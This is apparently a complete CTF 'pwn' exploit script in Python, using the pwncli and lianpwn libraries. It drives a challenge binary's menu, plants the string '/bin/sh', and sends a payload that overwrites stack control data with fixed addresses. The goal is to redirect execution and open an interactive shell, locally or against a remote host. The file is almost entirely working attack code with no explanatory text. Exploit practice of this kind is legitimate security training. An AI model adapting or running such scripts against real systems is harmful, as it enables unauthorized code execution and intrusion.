#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"Your chocie:")
    sl(i2b(choice))


def trace(data):
    cmd(1)
    ru(b"You can record log details here: ")
    s(data)
    ru(b"Do you need to check the records?")
    sl(b"y")


def warn(data):
    cmd(2)
    ru(b"Type your message here plz:")
    s(data)


for i in range(8):
    trace(b"a" * 0x10)

trace(b"/bin/sh\x00")

payload = flat(
    {0: [0xDEADBEEF, 0xDEADCAFE, 0xCAFECAFE], 0x70: [0x404200 + 8, 0x401BC2 + 1]}
)
warn(payload)

ia()

# 94611941604724180481409014608611
